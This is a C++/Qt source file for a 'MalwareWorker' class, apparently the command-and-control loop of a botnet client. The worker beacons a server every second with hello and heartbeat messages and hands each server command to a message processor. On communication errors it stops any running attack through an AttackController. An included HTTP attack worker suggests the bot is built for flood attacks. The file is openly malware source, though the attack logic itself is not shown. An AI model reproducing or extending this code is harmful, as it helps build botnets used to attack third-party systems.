#include <QCoreApplication>

#include "../SharedKernel/Network/Http/httpserveradapter.h"
#include "../Network/Messages/Client/heartbeatmessage.h"
#include "../Network/Messages/Client/hellomessage.h"
#include "../Processors/processorresolver.h"
#include "../Utilities/logging.h"
#include "httpattackworker.h"
#include "malwareworker.h"

using namespace controllers;
using namespace network::messages::client;
using namespace network::http;
using namespace processors;
using namespace workers;
using namespace utilities;

namespace workers
{
    MalwareWorker::MalwareWorker()
    {
    }

    void MalwareWorker::doWork()
    {
        processorResolver_ = std::make_unique<ProcessorResolver>();
        serverAdapter_ = std::make_unique<HttpServerAdapter>();
        timer_ = std::make_unique<QTimer>();

        QObject::connect(serverAdapter_.get(), SIGNAL(receive(std::shared_ptr<network::messages::server::ServerMessage>)), this, SLOT(onNewServerMessage(std::shared_ptr<network::messages::server::ServerMessage>)));
        QObject::connect(serverAdapter_.get(), SIGNAL(serverReplied()), this, SLOT(onServerReplied()));
        QObject::connect(serverAdapter_.get(), SIGNAL(error(QString)), this, SLOT(onError(QString)));

        timer_->setInterval(1000);
        connect(timer_.get(), SIGNAL(timeout()), this, SLOT(onTick()));
        timer_->start();
    }

    void MalwareWorker::onTick()
    {
        if(!hasEmittedHello_)
        {
            serverAdapter_->send(HelloMessage());
        }
        else
        {
            serverAdapter_->send(HeartbeatMessage());
        }
    }

    void MalwareWorker::onNewServerMessage(std::shared_ptr<network::messages::server::ServerMessage> message)
    {
        std::shared_ptr<MessageProcessorBase> processor = processorResolver_->resolve(message);
        processor.get()->process(message, *serverAdapter_.get());
    }

    void MalwareWorker::onServerReplied()
    {
        if(!hasEmittedHello_)
        {
            Logging::get().write("Connection established with the server.");
            isInError = false;
        }

        hasEmittedHello_ = true;
    }

    void MalwareWorker::onError(QString error)
    {
        if(!isInError)
        {
            Logging::get().write("An error occurred while communicating with the server (" + error + ").");

            // Prevent to spam this message
            isInError = true;

            // Reset the flag to reinitialize the state of the bot
            hasEmittedHello_ = false;

            // Stop any attack
            AttackController::get().stop();
        }
    }
}
